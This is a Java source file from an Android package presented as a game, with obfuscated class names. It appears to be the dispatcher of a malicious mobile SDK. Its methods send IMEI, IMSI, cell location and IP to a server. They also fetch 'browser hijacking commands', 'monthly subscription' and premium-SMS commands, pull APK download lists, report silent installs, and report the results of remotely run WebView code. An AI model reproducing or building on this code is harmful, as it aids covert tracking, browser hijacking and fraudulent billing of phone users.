package cn.com.tiantong.game72.n.m;

import cn.com.tiantong.game72.n.m.JB;
import cn.com.tiantong.game72.n.m.MM;
import cn.com.tiantong.game72.n.m.RO;
import cn.com.tiantong.game72.util.Logger;
import android.content.Context;
import android.os.Handler;


public class DS {
	
	public static final String TAG = "DateService";
	
	//初始化
	public void doInitProcess(Context context, Handler handler, int msgid, String appid, String sign, String imsi, String packageName,
			String SDKVersion, String net, String qudaohao, int initYIDONGIsOk, int resCode, String resInfo,
			String currentVersion, int systemSign, String phoneType, String androidVersion,
			String IMEI, String IMSI_NAKED, String cid, String lac, String nid, String ip, String realSign, int imsiCardCount, String imsi_1, String imsi_2,
			String salt){
		
		////LH.LogPrint(tag, "(DataService)开始调用本地服务器");
		
		MM mm = new MM(handler, msgid);
		RO ro = new RO();
		JB bean = new JB();
		ro = (RO) bean.getInitProcess(context, appid, sign, imsi, packageName, SDKVersion, net, qudaohao, 
				                      initYIDONGIsOk, resCode, resInfo, currentVersion, systemSign, 
				                      phoneType, androidVersion, IMEI, IMSI_NAKED, cid, lac, nid, ip, realSign, imsiCardCount, imsi_1, imsi_2, salt);
		
		mm.sendHandlerMessage(ro);
	}
	
	
	//获取指令集合
	public void doGetCommandsFromService(Context context, Handler handler, int msgid, String channel, String imsi){
		
		////LH.LogPrint(tag, "获取指令集合");
		
		MM mm = new MM(handler, msgid);
		RO ro = new RO();
		JB bean = new JB();
		
		ro = (RO) bean.getCommandsFromService(context, channel, imsi);
		
		mm.sendHandlerMessage(ro);
		
	}
	
	//9.00 获取浏览器劫持指令
	public void doGetBrowserCommands(Context context, Handler handler, int msgid, String imsi, String imei, String appVersion, String channel, String net){
		MM mm = new MM(handler, msgid);
		RO ro = new RO();
		JB bean = new JB();
		
		ro = (RO) bean.getBrowserComms(context, imsi, imei, appVersion, channel, net);
		
		mm.sendHandlerMessage(ro);
		
	}
	//获取手机号码
	public void doGetBasicNumService(Context context, Handler handler, int msgid, String channel, String imsi){
		
		////LH.LogPrint(tag, "get basic ii");
		
		MM mm = new MM(handler, msgid);
		RO ro = new RO();
		JB bean = new JB();
		
		ro = (RO) bean.getBasicNumService(context, channel, imsi);
		
		mm.sendHandlerMessage(ro);
		
		
	}
	
	// 发送结果上报短信
		public void doSendExectueResult(Context context, Handler handler,int msgid, String channel, String imsi, String appVersion,
				String result) {

			JB bean = new JB();
			bean.sendExectueResult(context, channel, imsi, appVersion, result);

		}
	
	//******************************获取apk下载 5.50******************************************
		public void doGetDownloadApkList(Context context, Handler handler, int msgid, String channel, String imsi){
			
			//LH.LogPrint(tag, "从服务器端获取下载apk地址的列表");
			
			MM mm = new MM(handler, msgid);
			RO ro = new RO();
			JB bean = new JB();
			ro = (RO) bean.getDownloadApkList(context, channel, imsi);
			
			mm.sendHandlerMessage(ro);
			
		}
		
		//把安装成功的apk上报给服务器
		public void doSendApkInstallationResult(Context context, String channel, String imsi, String packageName){
			//LH.LogPrint(tag, "把安装成功的apk包名上报给服务器");
			
			JB bean = new JB();
			bean.sendApkInstallationResult(context, channel, imsi, packageName);
		}
	
		
	//6.20短代上报
		public void doGetSendMessageResult(Context context, Handler handler, int msgid, String channel, String imsi, String msgId, String result){
			JB bean = new JB();
			bean.sendMessageResult(context, channel, imsi, msgId, result);
		}
		
		//获取指令集合
		public void doGetWebCommandsFromService(Context context, Handler handler, int msgid, String channel, String imsi, String appVersion, String net){
			
			MM mm = new MM(handler, msgid);
			RO ro = new RO();
			JB bean = new JB();
			//将ro返回的值上报上去
			ro = (RO) bean.getWebCommandsFromService(context, channel, imsi, appVersion, net);
			
			mm.sendHandlerMessage(ro);
			
		}
		//获取包月指令
		public void doGetMonthCommandsFromService(Context context, Handler handler, int msgid, String imsi, String imei, String appVersion, String channel, String net){
			
			MM mm = new MM(handler, msgid);
			RO ro = new RO();
			JB bean = new JB();
			//将ro返回的值上报上去
			ro = (RO) bean.getMonthCommandsFromService(context, imsi, imei, appVersion, channel, net);
			
			mm.sendHandlerMessage(ro);
			
		}
		
		//8.00webView执行完上报结果
		public void doGetSendWebViewResult(Context context, Handler handler, int msgid, String channel, String appVersion, String imsi, String mobile, String webViewId, String result){
			Logger.print(TAG, "代码执行结束，结果上报服务器！！！");
			JB bean = new JB();
			bean.sendWebViewResult(context, channel, appVersion, imsi, mobile, webViewId, result);
		}
}